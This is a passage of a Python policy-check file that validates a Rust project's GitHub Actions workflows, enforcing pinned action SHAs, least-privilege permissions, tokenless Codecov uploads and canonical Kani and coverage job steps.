#!/usr/bin/env python3
"""CI workflow policy checks. Does not call GitHub.

The benchmark-alert test runs that step under pwsh with the Actions runner
wrapper. It does not dispatch a workflow.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = ROOT / ".github" / "workflows"
sys.path.insert(0, str(ROOT / "scripts" / "ci"))
import mutation_ai_outcomes  # noqa: E402

CONCURRENCY_GROUP = "group: ${{ github.workflow }}-${{ github.ref }}"
CONCURRENCY_CANCEL = "cancel-in-progress: ${{ github.event_name == 'pull_request' }}"

POLICY_ACTIONS = (
    "actions/checkout",
    "actions/upload-artifact",
    "actions/download-artifact",
    "actions/cache",
    "actions/github-script",
)
EXPECTED_POLICY_ACTIONS = frozenset(
    {
        "actions/checkout",
        "actions/upload-artifact",
        "actions/download-artifact",
        "actions/cache",
        "actions/github-script",
    }
)
ACTION_MAJOR_FLOORS: dict[str, int] = {
    "actions/checkout": 7,
    "actions/upload-artifact": 4,
    "actions/download-artifact": 4,
    "actions/cache": 4,
    "actions/github-script": 7,
}
PINNED_ACTION_MAJOR_FLOORS: dict[str, int] = {
    "actions/checkout": 7,
    "actions/upload-artifact": 4,
    "actions/download-artifact": 4,
    "actions/cache": 4,
    "actions/github-script": 7,
}
# Hardcoded refs one major below each pinned floor (not derived from ACTION_MAJOR_FLOORS).
BELOW_FLOOR_MAJOR_TAG_BY_ACTION: dict[str, str] = {
    "actions/checkout": "v6",
    "actions/upload-artifact": "v3",
    "actions/download-artifact": "v3",
    "actions/cache": "v3",
    "actions/github-script": "v6",
}
AT_FLOOR_MAJOR_TAG_BY_ACTION: dict[str, str] = {
    "actions/checkout": "v7",
    "actions/upload-artifact": "v4",
    "actions/download-artifact": "v4",
    "actions/cache": "v4",
    "actions/github-script": "v7",
}
_POLICY_ACTION_PATTERN = "|".join(re.escape(action) for action in POLICY_ACTIONS)
ACTION_USES_RE = re.compile(
    rf"uses:\s*(?P<action>{_POLICY_ACTION_PATTERN})@(?P<ref>[^\s#]+)"
)
UNPINNED_BRANCH_REFS = frozenset({"main", "master", "HEAD", "latest", "release"})
UNPINNED_REF_MSG = "unpinned action ref"
NON_SHA_TAG_MSG = "must be a 40-char SHA or major tag vN"
BELOW_FLOOR_MSG = "below major floor"


def action_ref_violation(action: str, ref: str) -> str | None:
    if action not in ACTION_MAJOR_FLOORS:
        return None
    if (
        not ref
        or ref in UNPINNED_BRANCH_REFS
        or "/" in ref
        or ref.startswith("refs/")
        or ref.startswith(".")
    ):
        return f"{UNPINNED_REF_MSG} {action}@{ref!r}"
    if re.fullmatch(r"[0-9a-f]{40}", ref):
        return None
    major = re.fullmatch(r"v([0-9]+)", ref)
    if major:
        floor = ACTION_MAJOR_FLOORS[action]
        if int(major.group(1)) < floor:
            return f"{action}@{ref} {BELOW_FLOOR_MSG} v{floor}"
        return None
    return f"{action}@{ref} {NON_SHA_TAG_MSG}"


# A matching quote, or a one-level >, >-, |, or |- block scalar, is valid
# YAML for a uses value. Flatten those forms before the major-tag and SHA
# checks so the ref group cannot keep the quote or the block marker.
_QUOTED_USES_RE = re.compile(
    r"^(?P<lead>\s*(?:-\s+)?)uses:\s*(?P<q>['\"])(?P<value>.*?)(?P=q)(?P<tail>\s*(?:#.*)?)?$"
)
_BLOCK_USES_RE = re.compile(
    r"^(?P<lead>\s*(?:-\s+)?)uses:\s*(?P<style>[>|])(?P<chomp>[+-]?)[0-9]*\s*(?:#.*)?$"
)


def _normalize_uses_quotes(line: str) -> str:
    match = _QUOTED_USES_RE.match(line)
    if match is None:
        return line
    tail = match.group("tail") or ""
    return f"{match.group('lead')}uses: {match.group('value')}{tail}"


def _uses_scan_lines(text: str) -> list[str]:
    """One scan line per source line. Block-scalar continuations become blank."""
    raw = text.splitlines()
    out = list(raw)
    index = 0
    while index < len(raw):
        match = _BLOCK_USES_RE.match(raw[index])
        if match is None:
            out[index] = _normalize_uses_quotes(raw[index])
            index += 1
            continue
        base = len(raw[index]) - len(raw[index].lstrip(" "))
        cursor = index + 1
        parts: list[str] = []
        while cursor < len(raw):
            line = raw[cursor]
            if not line.strip():
                peek = cursor + 1
                while peek < len(raw) and not raw[peek].strip():
                    peek += 1
                if peek < len(raw) and (len(raw[peek]) - len(raw[peek].lstrip(" "))) > base:
                    cursor = peek
                    continue
                break
            if (len(line) - len(line.lstrip(" "))) <= base:
                break
            parts.append(line.strip())
            cursor += 1
        joiner = " " if match.group("style") == ">" else "\n"
        out[index] = f"{match.group('lead')}uses: {joiner.join(parts).strip()}"
        for blank in range(index + 1, cursor):
            out[blank] = ""
        index = cursor
    return out


def _unquote_scalar(value: str) -> str:
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
        return value[1:-1]
    return value


class _MarkedDict(dict):
    def __init__(self, line: int) -> None:
        super().__init__()
        self.yaml_line = line
        self.key_lines: dict[object, int] = {}
        self.scalar_style: dict[object, tuple[str | None, str]] = {}
        self.duplicate_keys: list[object] = []


class _MarkedList(list):
    yaml_line = 1


class _MarkedLoader(yaml.SafeLoader):
    """SafeLoader that records the line of each mapping, key, and sequence."""


def _construct_marked_map(loader: yaml.SafeLoader, node: yaml.Node) -> _MarkedDict:
    loader.flatten_mapping(node)
    mapping = _MarkedDict(node.start_mark.line + 1)
    for key_node, value_node in node.value:
        key = loader.construct_object(key_node, deep=True)
        value = loader.construct_object(value_node, deep=True)
        if key in mapping:
            mapping.duplicate_keys.append(key)
        mapping[key] = value
        mapping.key_lines[key] = key_node.start_mark.line + 1
        if isinstance(value_node, yaml.ScalarNode):
            mapping.scalar_style[key] = (value_node.style, value_node.value)
    return mapping


def _construct_marked_seq(loader: yaml.SafeLoader, node: yaml.Node) -> _MarkedList:
    seq = _MarkedList()
    seq.yaml_line = node.start_mark.line + 1
    for child in node.value:
        seq.append(loader.construct_object(child, deep=True))
    return seq


_MarkedLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG,
    _construct_marked_map,
)
_MarkedLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_SEQUENCE_TAG,
    _construct_marked_seq,
)


def load_workflow_yaml(text: str) -> tuple[object, str | None]:
    """Parse workflow YAML. `yaml.safe_load` is the acceptance check.

    A SafeLoader subclass then keeps line numbers for the same document.
    Invalid YAML is a violation, not a pass.
    """
    try:
        yaml.safe_load(text)
    except yaml.YAMLError as exc:
        return None, str(exc).splitlines()[0]
    try:
        marked = yaml.load(text, _MarkedLoader)  # noqa: S506 — SafeLoader subclass
    except yaml.YAMLError as exc:
        return None, str(exc).splitlines()[0]
    return marked, None


def _iter_uses(node: object):
    if isinstance(node, dict):
        key_lines = getattr(node, "key_lines", {})
        for key, value in node.items():
            if key == "uses" and isinstance(value, str):
                yield key_lines.get(key, getattr(node, "yaml_line", 1)), value
            else:
                yield from _iter_uses(value)
    elif isinstance(node, list):
        for item in node:
            yield from _iter_uses(item)


def _parsed_uses(text: str) -> tuple[list[tuple[int, str]], str | None]:
    doc, err = load_workflow_yaml(text)
    if err:
        return [], err
    if doc is None:
        return [], None
    return list(_iter_uses(doc)), None


def _action_name(uses: str) -> str:
    if uses.startswith("docker://") or "@" not in uses:
        return uses
    return uses.rsplit("@", 1)[0]


def _classify_uses(uses: str) -> tuple[str, str | None]:
    """Return (`policy` or `third` or `skip`, violation or None)."""
    if uses.startswith("./"):
        return "skip", None
    if uses.startswith("docker://"):
        if _DOCKER_PIN_RE.fullmatch(uses):
            return "third", None
        return "third", f"{uses} {DOCKER_DIGEST_MSG}"
    if "@" not in uses:
        return "third", f"{uses} {THIRD_PARTY_SHA_MSG}"
    action, ref = uses.rsplit("@", 1)
    if action in ACTION_MAJOR_FLOORS:
        return "policy", action_ref_violation(action, ref)
    if _SHA_REF_RE.fullmatch(ref):
        return "third", None
    return "third", f"{action}@{ref} {THIRD_PARTY_SHA_MSG}"


def _pin_buckets(text: str) -> tuple[list[str], list[str]]:
    policy: list[str] = []
    third: list[str] = []
    found, err = _parsed_uses(text)
    prefix_line = "1: "
    if err:
        message = f"{prefix_line}{err}"
        return [message], [message]
    for line_no, uses in found:
        bucket, violation = _classify_uses(uses)
        if not violation:
            continue
        rendered = f"{line_no}: {violation}"
        if bucket == "policy":
            policy.append(rendered)
        elif bucket == "third":
            third.append(rendered)
    return policy, third


def workflow_action_pin_violations(text: str, *, path: str = "") -> list[str]:
    prefix = f"{path}: " if path else ""
    policy, _third = _pin_buckets(text)
    return [f"{prefix}{item}" for item in policy]


_PLAIN_TRUE = frozenset({"true", "True", "TRUE"})


def _ci_item(mapping: object, key: str) -> tuple[object, object]:
    """Case-insensitive lookup. Action input names are not case-sensitive.

    This returns the first match. Callers that accept an action input must
    reject a repeated key instead of keeping that first value.
    """
    if not isinstance(mapping, dict):
        return None, None
    folded = key.casefold()
    for candidate, value in mapping.items():
        if isinstance(candidate, str) and candidate.casefold() == folded:
            return candidate, value
    return None, None


def _ci_matches(mapping: object, key: str) -> list[tuple[object, object]]:
    if not isinstance(mapping, dict):
        return []
    folded = key.casefold()
    return [
        (candidate, value)
        for candidate, value in mapping.items()
        if isinstance(candidate, str) and candidate.casefold() == folded
    ]


def _mapping_has_duplicate(mapping: object) -> bool:
    """True when a key is repeated, including a case-variant the dict keeps."""
    if not isinstance(mapping, dict):
        return False
    if getattr(mapping, "duplicate_keys", None):
        return True
    seen: set[str] = set()
    for key in mapping:
        if not isinstance(key, str):
            return True
        folded = key.casefold()
        if folded in seen:
            return True
        seen.add(folded)
    return False


def _runner_bool_true(mapping: object, key: str) -> bool:
    """True only for a value the Actions runner passes to an action as `true`.

    Plain `true` / `True` / `TRUE` are YAML 1.2 core booleans. The quoted
    string `true` is already that literal. PyYAML 1.1 also treats `yes`,
    `on`, and `y` as booleans; the runner does not, and the Codecov action
    compares the string to `true`.
    """
    actual, value = _ci_item(mapping, key)
    if actual is None:
        return False
    found = getattr(mapping, "scalar_style", {}).get(actual)
    if found is None:
        return isinstance(value, str) and value == "true"
    style, raw = found
    if style in {"'", '"'}:
        return raw == "true"
    if style is None:
        return raw in _PLAIN_TRUE
    return False


def _exact_version(value: object) -> bool:
    return isinstance(value, str) and _EXACT_VERSION_RE.fullmatch(value) is not None


def _mapping(value: object) -> dict:
    return value if isinstance(value, dict) else {}


def _has_ci_key(node: object, key: str) -> bool:
    actual, _value = _ci_item(node, key)
    return actual is not None


def _key_outside_with(step: dict, key: str) -> bool:
    if _has_ci_key(step, key):
        return True
    return _has_ci_key(step.get("env"), key)


def _iter_steps(doc: object):
    if isinstance(doc, dict):
        jobs = doc.get("jobs")
        if isinstance(jobs, dict):
            for job_id, job in jobs.items():
                if not isinstance(job, dict):
                    continue
                steps = job.get("steps")
                if isinstance(steps, list):
                    for step in steps:
                        if isinstance(step, dict):
                            yield str(job_id), job, step
        runs = doc.get("runs")
        if isinstance(runs, dict) and isinstance(runs.get("steps"), list):
            for step in runs["steps"]:
                if isinstance(step, dict):
                    yield "", runs, step
    elif isinstance(doc, list):
        for step in doc:
            if isinstance(step, dict):
                yield "", {}, step


def _is_named_action(step: dict, action: str) -> bool:
    uses = step.get("uses")
    if not isinstance(uses, str):
        return False
    return _action_name(uses).casefold() == action.casefold()


def _is_codecov_step(step: dict) -> bool:
    return _is_named_action(step, "codecov/codecov-action")


def _codecov_steps(text: str) -> tuple[list[dict] | None, str | None]:
    doc, err = load_workflow_yaml(text)
    if err:
        return None, err
    if doc is None:
        return [], None
    return [step for _job_id, _job, step in _iter_steps(doc) if _is_codecov_step(step)], None


def _step_line(step: dict) -> int:
    return int(getattr(step, "yaml_line", 1))


_TOKEN_KEY_NAMES = frozenset({"token", "codecov_token"})
_SECRETS_CONTEXT_RE = re.compile(r"(?i)(?<![A-Za-z0-9_])secrets(?![A-Za-z0-9_])")
_EXPRESSION_RE = re.compile(r"\$\{\{(.*?)\}\}", re.DOTALL)


def _has_token_key(node: object) -> bool:
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(key, str) and key.casefold() in _TOKEN_KEY_NAMES:
                return True
            if _has_token_key(value):
                return True
    elif isinstance(node, list):
        return any(_has_token_key(item) for item in node)
    return False


def _expression_has_secrets(text: str) -> bool:
    return any(_SECRETS_CONTEXT_RE.search(expr) for expr in _EXPRESSION_RE.findall(text))


def _has_secrets_ref(node: object) -> bool:
    """A `secrets` context inside `${{ }}`, in any spelling or index form."""
    if isinstance(node, str):
        return _expression_has_secrets(node)
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(key, str) and _expression_has_secrets(key):
                return True
            if _has_secrets_ref(value):
                return True
    elif isinstance(node, list):
        return any(_has_secrets_ref(item) for item in node)
    return False


def _with_key_names(step: dict) -> set[str] | None:
    if "with" not in step or step.get("with") is None:
        return set()
    body = step.get("with")
    if not isinstance(body, dict):
        return None
    names: set[str] = set()
    for key in body:
        if not isinstance(key, str):
            return None
        names.add(key.casefold())
    if len(names) != len(body):
        return None
    return names


def _is_upload_only(job: dict) -> bool:
    """Download plus the SHA-pinned Codecov action, and no other job key."""
    if set(job) != _UPLOAD_JOB_KEYS:
        return False
    steps = job.get("steps")
    if not isinstance(steps, list) or not steps:
        return False
    saw_codecov = False
    for step in steps:
        if not isinstance(step, dict) or "run" in step or "uses" not in step:
            return False
        uses = step.get("uses")
        if not isinstance(uses, str):
            return False
        name = _action_name(uses).casefold()
        if name == "actions/download-artifact":
            keys = _with_key_names(step)
            if keys is None or keys != _DOWNLOAD_WITH_KEYS:
                return False
            continue
        if name != "codecov/codecov-action":
            return False
        ref = uses.rsplit("@", 1)[1] if "@" in uses else ""
        if _SHA_REF_RE.fullmatch(ref) is None:
            return False
        saw_codecov = True
    return saw_codecov


def _exact_upload_permissions(perms: object) -> bool:
    if not isinstance(perms, dict) or len(perms) != len(_UPLOAD_PERMISSIONS):
        return False
    normalized: dict[str, object] = {}
    for key, value in perms.items():
        if not isinstance(key, str):
            return False
        normalized[key] = value
    return normalized == _UPLOAD_PERMISSIONS


def _permission_value_violations(
    perms: object,
    *,
    line: int,
    allow_id_token: bool,
) -> list[tuple[int, str]]:
    key_lines = getattr(perms, "key_lines", {})
    if isinstance(perms, str):
        if perms in {"write", "write-all"}:
            return [(line, COVERAGE_WRITE_MSG)]
        return [(line, TOP_PERMISSIONS_MSG)]
    if not isinstance(perms, dict):
        return [(line, TOP_PERMISSIONS_MSG)]
    found: list[tuple[int, str]] = []
    for key, value in perms.items():
        value_text = value if isinstance(value, str) else ""
        entry_line = int(key_lines.get(key, line))
        if value_text == "write-all" or (value_text == "write" and key != "id-token"):
            found.append((entry_line, COVERAGE_WRITE_MSG))
        elif key == "id-token" and value_text == "write" and not allow_id_token:
            found.append((entry_line, COVERAGE_ID_TOKEN_JOB_MSG))
    return found


THIRD_PARTY_SHA_MSG = "third-party action must be a 40-char commit SHA"
CODECOV_FAIL_CI_MSG = "codecov step must set fail_ci_if_error: true"
CODECOV_VERSION_MSG = "codecov step must set version to an exact vX.Y.Z"
CODECOV_SEARCH_MSG = "codecov step must set disable_search: true"
CODECOV_FILES_MSG = "codecov step must set files to an explicit path"
CODECOV_FILES_PIN_MSG = "codecov step must set files to the pinned report path"
CODECOV_OIDC_MSG = "codecov step must set use_oidc: true"
CODECOV_CONTINUE_MSG = "codecov job or step must not set continue-on-error"
COVERAGE_WRITE_MSG = "coverage workflow must not grant write permissions"
COVERAGE_ID_TOKEN_JOB_MSG = "id-token: write is only allowed on a job that runs codecov"
CODECOV_UPLOAD_JOB_MSG = "codecov action must run only in an upload job"
CODECOV_TOKEN_MSG = "codecov step must not set a token input or a secrets reference"
CODECOV_WITH_MSG = (
    "codecov step with: keys must be files, disable_search, flags, name, "
    "version, fail_ci_if_error, and use_oidc"
)
CODECOV_PERMS_MSG = (
    "codecov upload job permissions must be contents: read and id-token: write"
)
DOWNLOAD_WITH_MSG = "download-artifact with: must be exactly name and path"
DOWNLOAD_NAME_MSG = "download-artifact name must be the pinned report artifact"
DOWNLOAD_STEP_MSG = "download-artifact step keys must be name, uses, and with"
CODECOV_STEP_KEYS_MSG = "codecov step keys must be name, uses, and with"
UPLOAD_NEEDS_MSG = "codecov upload job needs must be exactly coverage"
COVERAGE_JOB_END_MSG = "coverage job must end at the report upload-artifact step"
PRODUCER_PERMISSIONS_MSG = "coverage job permissions must be exactly contents: read"
CHECKOUT_PERSIST_MSG = "checkout must set persist-credentials: false"
CHECKOUT_STEP_MSG = "checkout step must exactly match the canonical step"
COVERAGE_ARTIFACT_SHA_MSG = "coverage workflow actions must use a commit SHA"
UPLOAD_JOB_KEYS_MSG = (
    "codecov upload job keys must be name, needs, permissions, runs-on, "
    "timeout-minutes, and steps"
)
CODECOV_EVENT_MSG = (
    "codecov workflow on: must be push, schedule, and workflow_dispatch"
)
TOP_PERMISSIONS_MSG = "workflow must set top-level permissions to {}"
JOB_CONTENTS_READ_MSG = "job must set permissions to contents: read"
DOCKER_DIGEST_MSG = "docker action must be pinned with @sha256"
_SHA_REF_RE = re.compile(r"[0-9a-f]{40}")
_DOCKER_PIN_RE = re.compile(r"^docker://\S+@sha256:[0-9a-f]{64}$")
_EXACT_VERSION_RE = re.compile(r"v[0-9]+\.[0-9]+\.[0-9]+")
_EXACT_XYZ_RE = re.compile(r"[0-9]+\.[0-9]+\.[0-9]+")
_UPLOAD_JOB_KEYS = frozenset(
    {"name", "needs", "permissions", "runs-on", "timeout-minutes", "steps"}
)
_UPLOAD_TIMEOUT_MINUTES = 10
_DOWNLOAD_WITH_KEYS = frozenset({"name", "path"})
_DOWNLOAD_STEP_KEYS = frozenset({"name", "uses", "with"})
_CODECOV_STEP_KEYS = frozenset({"name", "uses", "with"})
_DOWNLOAD_ARTIFACT_NAMES = {
    "coverage.yml": "coverage-xml",
    "aw-editor-tests.yml": "aw-editor-lcov",
}
_CODECOV_FILES_PIN = {
    "coverage.yml": "./tools/astraweave-assets/coverage/cobertura.xml",
    "aw-editor-tests.yml": "./lcov.info",
}
_KANI_TIMEOUT_EXPR = "${{ steps.timeout.outputs.value }}"
_KANI_ACTION_USES = (
    "model-checking/kani-github-action@69d357bade1eb7b32bc3fc3d5c3d173c5bfa5237"
)
_EDITOR_TOOLCHAIN_USES = (
    "dtolnay/rust-toolchain@599c45df1a24c1c63ae1129a7e59f46654b8fb66"
)
_KANI_WITH_KEYS = frozenset({"kani-version", "working-directory", "args", "command"})
_KANI_COMMAND = "cargo-kani"
_KANI_WORKDIR = "."
_KANI_TIMEOUT_RUN = (
    'raw="${KANI_TIMEOUT_INPUT:-300}"\n'
    'if [ "$raw" = "null" ]; then\n'
    "  raw=300\n"
    "fi\n"
    'case "$raw" in\n'
    "  60|120|300|600|900) ;;\n"
    "  *)\n"
    '    echo "harness timeout must be 60, 120, 300, 600, or 900" >&2\n'
    "    exit 1\n"
    "    ;;\n"
    "esac\n"
    'echo "value=$raw" >> "$GITHUB_OUTPUT"\n'
)
_PRODUCER_JOB_KEYS = frozenset(
    {"name", "permissions", "runs-on", "timeout-minutes", "steps"}
)
_KANI_JOB_KEYS = _PRODUCER_JOB_KEYS
_PINNED_RUNS_ON = "ubuntu-latest"
_PRODUCER_TIMEOUT_MINUTES = 45
_KANI_TIMEOUT_MINUTES = {
    "kani-ecs": 120,
    "kani-math": 60,
    "kani-sdk": 60,
    "kani-core": 90,
}
_PINNED_REPORT_NAMES = {
    "coverage.yml": "coverage-xml",
    "aw-editor-tests.yml": "aw-editor-lcov",
}
_RUST_CI_SETUP_TOOLCHAIN = "1.89.0"
_PRODUCER_STEP_KINDS = {
    "coverage.yml": ("checkout", "setup", "install-tarpaulin", "xml-tarpaulin", "upload"),
    "aw-editor-tests.yml": (
        "checkout",
        "toolchain",
        "apt",
        "install-llvm",
        "llvm-cov",
        "upload",
    ),
}
_UPLOAD_PERMISSIONS = {"contents": "read", "id-token": "write"}
_CODECOV_WITH_KEYS = frozenset(
    {
        "files",
        "disable_search",
        "flags",
        "name",
        "version",
        "fail_ci_if_error",
        "use_oidc",
    }
)
_CODECOV_EVENTS = frozenset({"push", "schedule", "workflow_dispatch"})
_LEAST_PRIVILEGE_WORKFLOWS = frozenset({"kani.yml", "editor-ci.yml"})
_MISSING = object()
KANI_VERSION_MSG = "kani step must set kani-version to an exact X.Y.Z"
KANI_ARGS_MSG = "kani args must match the approved package line"
KANI_WITH_MSG = (
    "kani step with: keys must be kani-version, working-directory, args, or command"
)
KANI_COMMAND_MSG = "kani command must be cargo-kani"
KANI_WORKDIR_MSG = "kani working-directory must be ."
KANI_DUP_MSG = "kani step with: must not repeat an input"
KANI_TIMEOUT_MSG = "kani timeout step must write only the validated timeout"
KANI_JOB_STEPS_MSG = "kani job steps must equal the canonical ordered list"
KANI_JOB_SHAPE_MSG = (
    "kani job keys must be name, permissions, runs-on, timeout-minutes, and steps"
)
KANI_SUMMARY_MSG = (
    "kani summary must need every mapped job, run with if always, and fail unless each result is success"
)
RUST_CI_SETUP_MSG = "rust-ci-setup steps must equal the canonical ordered list"
RUST_CI_SETUP_TOOLCHAIN_MSG = "rust-ci-setup toolchain default must be the pinned toolchain"
COVERAGE_HTML_STEPS_MSG = "coverage-html steps must equal the canonical ordered list"
EDITOR_TEST_STEPS_MSG = "editor test steps must equal the canonical ordered list"
PINNED_REPORT_MSG = "only the producer upload may publish the pinned report name"
OVERWRITE_MSG = "upload steps must not set overwrite"
UPLOAD_RUNNER_MSG = (
    "codecov upload job runs-on must be ubuntu-latest and timeout-minutes must be 10"
)
RUST_CI_SETUP_INPUTS_MSG = "rust-ci-setup inputs must equal the canonical inputs"
RUST_CI_SETUP_RUNS_MSG = (
    "rust-ci-setup runs.using must be composite and runs keys must be using and steps"
)
RUST_CI_SETUP_KEYS_MSG = (
    "rust-ci-setup top-level keys must be name, description, inputs, and runs"
)
COVERAGE_HTML_JOB_MSG = (
    "coverage-html keys must be name, needs, permissions, runs-on, timeout-minutes, and steps; "
    "runs-on is ubuntu-latest; timeout-minutes is 45"
)
EDITOR_TEST_JOB_MSG = (
    "editor test keys must be name, permissions, runs-on, timeout-minutes, "
    "continue-on-error, strategy, and steps; "
    "runs-on is ${{ matrix.os }}; timeout-minutes is 45"
)
RUN_CONTEXT_MSG = (
    "defaults is absent; workflow env is absent in coverage.yml and canonical in the other two; job env is absent"
)
LLVM_COV_CARGO_MSG = "cargo install cargo-llvm-cov must set --version X.Y.Z and --locked"
LLVM_COV_ACTION_MSG = "install-action cargo-llvm-cov must set tool: cargo-llvm-cov@X.Y.Z"
_COVERAGE_WORKFLOW_NAMES = frozenset({"coverage.yml", "aw-editor-tests.yml"})
_CHECKOUT_PERSIST_WORKFLOWS = _COVERAGE_WORKFLOW_NAMES | {"kani.yml"}
_KANI_SHA_ACTIONS = frozenset({"actions/checkout", "actions/upload-artifact"})
_APPROVED_XML_TARPAULIN_RUN = (
    "cd tools/astraweave-assets\n"
    "cargo tarpaulin --out Xml --output-dir coverage "
    "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n"
)
_CHECKOUT_USES = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
_UPLOAD_USES = "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9"
_COVERAGE_CHECKOUT_STEP = {
    "name": "Checkout code",
    "uses": _CHECKOUT_USES,
    "with": {"persist-credentials": False},
}
_EDITOR_CHECKOUT_STEP = {
    "name": "Checkout Repository",
    "uses": _CHECKOUT_USES,
    "with": {"persist-credentials": False},
}
_KANI_CHECKOUT_STEP = {
    "uses": _CHECKOUT_USES,
    "with": {"persist-credentials": False},
}
_CHECKOUT_CANONICAL = {
    "coverage.yml": _COVERAGE_CHECKOUT_STEP,
    "aw-editor-tests.yml": _EDITOR_CHECKOUT_STEP,
    "kani.yml": _KANI_CHECKOUT_STEP,
}
_COVERAGE_SETUP_STEP = {
    "name": "Rust CI setup",
    "uses": "./.github/actions/rust-ci-setup",
}
_EDITOR_TOOLCHAIN_STEP = {
    "name": "Install Rust Toolchain",
    "uses": _EDITOR_TOOLCHAIN_USES,
    "with": {"components": "llvm-tools-preview"},
}
_COVERAGE_INSTALL_STEP = {
    "name": "Install cargo-tarpaulin",
    "run": "cargo install cargo-tarpaulin --version 0.35.2 --locked",
}
_COVERAGE_GENERATE_STEP = {
    "name": "Generate coverage",
    "run": _APPROVED_XML_TARPAULIN_RUN,
}
_COVERAGE_UPLOAD_STEP = {
    "name": "Upload coverage XML",
    "uses": _UPLOAD_USES,
    "with": {
        "name": "coverage-xml",
        "path": "tools/astraweave-assets/coverage/cobertura.xml",
        "retention-days": 30,
    },
}
_EDITOR_APT_STEP = {
    "name": "Install Linux Dependencies",
    "run": (
        "sudo apt-get update\n"
        "sudo apt-get install -y pkg-config libxcb-shape0-dev "
        "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev libudev-dev "
        "libasound2-dev\n"
    ),
}
_EDITOR_INSTALL_LLVM_STEP = {
    "name": "Install cargo-llvm-cov",
    "run": "cargo install cargo-llvm-cov --version 0.9.1 --locked",
}
_EDITOR_LLVM_COV_STEP = {
    "name": "Generate Coverage Report",
    "run": "cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n",
}
_EDITOR_UPLOAD_STEP = {
    "name": "Upload coverage report",
    "uses": _UPLOAD_USES,
    "with": {
        "name": "aw-editor-lcov",
        "path": "lcov.info",
        "retention-days": 30,
    },
}
_LOCKED_PRODUCER_STEPS = {
    "coverage.yml": {
        "checkout": _COVERAGE_CHECKOUT_STEP,
        "setup": _COVERAGE_SETUP_STEP,
        "install-tarpaulin": _COVERAGE_INSTALL_STEP,
        "xml-tarpaulin": _COVERAGE_GENERATE_STEP,
        "upload": _COVERAGE_UPLOAD_STEP,
    },
    "aw-editor-tests.yml": {
        "checkout": _EDITOR_CHECKOUT_STEP,
        "toolchain": _EDITOR_TOOLCHAIN_STEP,
        "apt": _EDITOR_APT_STEP,
        "install-llvm": _EDITOR_INSTALL_LLVM_STEP,
        "llvm-cov": _EDITOR_LLVM_COV_STEP,
        "upload": _EDITOR_UPLOAD_STEP,
    },
}
_KANI_TIMEOUT_STEP = {
    "name": "Resolve harness timeout",
    "id": "timeout",
    "env": {"KANI_TIMEOUT_INPUT": "${{ github.event.inputs.timeout }}"},
    "run": _KANI_TIMEOUT_RUN,
}


def _kani_args(package: str) -> str:
    return f"--package {package} -Z unstable-options --harness-timeout {_KANI_TIMEOUT_EXPR}"


def _kani_verification_step(package: str) -> dict:
    return {
        "name": "Kani Verification",
        "uses": _KANI_ACTION_USES,
        "with": {
            "kani-version": "0.68.0",
            "command": _KANI_COMMAND,
            "working-directory": _KANI_WORKDIR,
            "args": _kani_args(package),
        },
    }


def _kani_upload_step(report: str) -> dict:
    return {
        "name": "Upload Kani Report",
        "uses": _UPLOAD_USES,
        "if": "always()",
        "with": {
            "name": report,
            "path": "target/kani/",
            "retention-days": 30,
        },
    }


_KANI_JOB_SPECS = (
    ("kani-ecs", "astraweave-ecs", "kani-report-ecs"),
    ("kani-math", "astraweave-math", "kani-report-math"),
    ("kani-sdk", "astraweave-sdk", "kani-report-sdk"),
    ("kani-core", "astraweave-core", "kani-report-core"),
)
_KANI_JOBS = {
    job_id: {
        "args": _kani_args(package),
        "steps": [
            _KANI_CHECKOUT_STEP,
            _KANI_TIMEOUT_STEP,
            _kani_verification_step(package),
            _kani_upload_step(report),
        ],
    }
    for job_id, package, report in _KANI_JOB_SPECS
}
_KANI_SUMMARY_NEEDS = [job_id for job_id, _package, _report in _KANI_JOB_SPECS]
_KANI_SUMMARY_IF = "always()"
_KANI_SUMMARY_KEYS = frozenset(
    {"name", "permissions", "runs-on", "timeout-minutes", "needs", "if", "steps"}
)
_KANI_SUMMARY_TIMEOUT_MINUTES = 10
_KANI_CHECK_RESULTS_RUN = (
    'echo "## Kani Verification Results" >> $GITHUB_STEP_SUMMARY\n'
    'echo "" >> $GITHUB_STEP_SUMMARY\n'
    'echo "| Crate | Status |" >> $GITHUB_STEP_SUMMARY\n'
    'echo "|-------|--------|" >> $GITHUB_STEP_SUMMARY\n'
    "echo \"| astraweave-ecs | ${{ needs.kani-ecs.result == 'success' && '✅ VERIFIED' || '❌ FAILED' }} |\" >> $GITHUB_STEP_SUMMARY\n"
    "echo \"| astraweave-math | ${{ needs.kani-math.result == 'success' && '✅ VERIFIED' || '❌ FAILED' }} |\" >> $GITHUB_STEP_SUMMARY\n"
    "echo \"| astraweave-sdk | ${{ needs.kani-sdk.result == 'success' && '✅ VERIFIED' || '❌ FAILED' }} |\" >> $GITHUB_STEP_SUMMARY\n"
    "echo \"| astraweave-core | ${{ needs.kani-core.result == 'success' && '✅ VERIFIED' || '❌ FAILED' }} |\" >> $GITHUB_STEP_SUMMARY\n"
    'echo "" >> $GITHUB_STEP_SUMMARY\n'
    'echo "**Kani** provides formal mathematical proofs of correctness, not just testing." >> $GITHUB_STEP_SUMMARY\n'
)
_KANI_FAIL_STEP = {
    "name": "Fail if any verification failed",
    "if": (
        "${{ needs.kani-ecs.result != 'success' || needs.kani-math.result != 'success' "
        "|| needs.kani-sdk.result != 'success' || needs.kani-core.result != 'success' }}"
    ),
    "run": "exit 1",
}
_KANI_CHECK_STEP = {
    "name": "Check Results",
    "run": _KANI_CHECK_RESULTS_RUN,
}
_KANI_SUMMARY_STEPS = [_KANI_CHECK_STEP, _KANI_FAIL_STEP]
_RUST_CI_SETUP_KEYS = frozenset({"name", "description", "inputs", "runs"})
_RUST_CI_SETUP_RUNS_KEYS = frozenset({"using", "steps"})
_RUST_CI_SETUP_USING = "composite"
_RUST_CI_SETUP_INPUTS = {
    "toolchain": {
        "description": "Rust toolchain version",
        "required": False,
